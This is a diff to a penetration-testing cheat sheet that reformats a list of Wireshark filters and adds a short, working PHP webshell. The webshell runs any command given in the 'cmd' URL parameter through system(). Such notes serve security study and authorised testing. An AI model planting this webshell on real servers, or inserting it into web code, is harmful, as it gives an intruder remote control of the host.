@@ -315,10 +315,24 @@
 **Resources:**
 - [HackTricks - LDAP Enumeration](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ldap-enumeration)
 
-#### Wireshark Filters
+## Wireshark Filters
 - ip.addr == 192.168.1.1
 - ip.src == 192.168.1.1
 - ip.dst == 192.168.1.1
 - tcp.port == 80
 - tcp.srcport == 443
 - tcp.dstport == 22
+
+- 
+## Simple PHP webshell
+```bash
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "Use ?cmd=[command] to execute commands.";
+}
+?>
+```
